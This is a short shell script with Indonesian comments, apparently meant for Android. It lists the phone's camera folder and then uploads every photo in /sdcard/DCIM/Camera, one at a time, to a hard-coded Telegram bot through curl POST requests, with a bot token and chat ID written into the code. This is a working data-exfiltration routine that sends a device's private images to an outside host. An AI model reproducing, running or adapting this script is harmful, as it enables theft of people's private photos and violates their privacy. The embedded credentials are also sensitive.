# Menampilkan daftar file
ls /storage/emulated/0/DCIM/Camera/

# Mengirim file satu per satu dengan jeda 2 detik
for file in /sdcard/DCIM/Camera/*; do
  echo "Mengirim file: $file"
  curl -X POST "https://api.telegram.org/bot7829941863:AAGm139bBNGSTEWd-wjVLvg8bksj_ucnuK4/sendDocument" -F chat_id=6235995291 -F document=@$file
  sleep 1  # Jeda 2 detik antar file
done
